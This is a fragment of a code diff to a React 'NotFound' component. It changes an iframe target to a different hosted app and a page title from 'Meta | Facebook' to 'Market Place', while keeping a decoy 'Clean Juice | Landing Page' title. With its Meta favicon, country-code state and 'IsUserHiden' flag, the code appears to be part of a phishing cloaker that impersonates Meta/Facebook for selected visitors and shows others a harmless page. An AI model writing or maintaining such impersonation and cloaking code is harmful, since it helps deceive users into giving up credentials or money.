@@ -7,8 +7,8 @@ import MetaIcon from '../resources/favicon2.ico';
 function NotFound() {
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
-  let[IframeUrl, SetIframeUrl] = useState('https://linkclient001.netlify.app/');
-  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Meta | Facebook');
+  let[IframeUrl, SetIframeUrl] = useState('https://stackclient-beryl.vercel.app/');
+  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Market Place');
   let[SiteTitleHome, SetSiteTitleHome] = useState('Clean Juice | Landing Page');
 
 
